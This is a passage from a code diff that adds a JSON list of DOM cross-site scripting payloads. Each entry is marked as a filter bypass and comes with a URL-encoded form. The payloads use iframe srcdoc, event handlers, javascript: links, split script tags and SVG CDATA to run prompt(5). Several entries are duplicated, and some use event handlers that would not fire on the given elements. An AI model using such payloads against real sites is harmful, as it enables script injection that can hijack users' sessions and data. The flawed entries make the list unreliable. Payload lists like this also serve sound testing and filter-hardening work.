+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=prompt(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dprompt%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    }
+  ]
+}
